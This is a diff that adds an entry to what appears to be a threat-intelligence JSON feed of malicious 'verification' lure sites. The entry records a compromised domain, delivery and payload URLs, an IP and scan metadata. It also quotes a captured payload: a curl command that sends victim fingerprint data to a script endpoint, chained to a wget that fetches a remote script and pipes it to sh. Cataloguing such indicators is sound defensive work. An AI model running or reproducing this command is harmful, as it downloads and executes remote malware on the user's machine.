@@ -1,5 +1,30 @@
 [
   {
+    "UrlDomain": "conferenciahertz.com",
+    "DeliveryUrl": [
+      "browse-cloud.codes",
+      "script.google.com",
+      "claude-flare-verification.vercel.app"
+    ],
+    "PayloadUrl": [
+      "https://claude-flare-verification.vercel.app/lin",
+      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
+      "https://claude-flare-verification.vercel.app/win",
+      "https://claude-flare-verification.vercel.app/mac"
+    ],
+    "IP": [
+      "77.37.83.156"
+    ],
+    "Related": [],
+    "Payload": "curl -sL -d \"id=69e0a4a8-9f08-4dce-8d93-b961c0037dfd&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fconferenciahertz[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-15T04%3A00%3A19.375Z&lastShellAt=2026-11-15T04%3A00%3A19.375Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://claude-flare-verification[.]vercel[.]app/lin' -L | sh",
+    "ResolvedDownloadUrl": [
+      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
+      "https://claude-flare-verification.vercel.app/lin"
+    ],
+    "ReportId": "cmwhb5rpu0ryt0omlc0rks6ff",
+    "ScannedAt": "2026-11-15T04:01:54.634000+00:00"
+  },
+  {
     "UrlDomain": "abdulwahabembroidery.com",
     "DeliveryUrl": [
       "browse-cloud.codes",
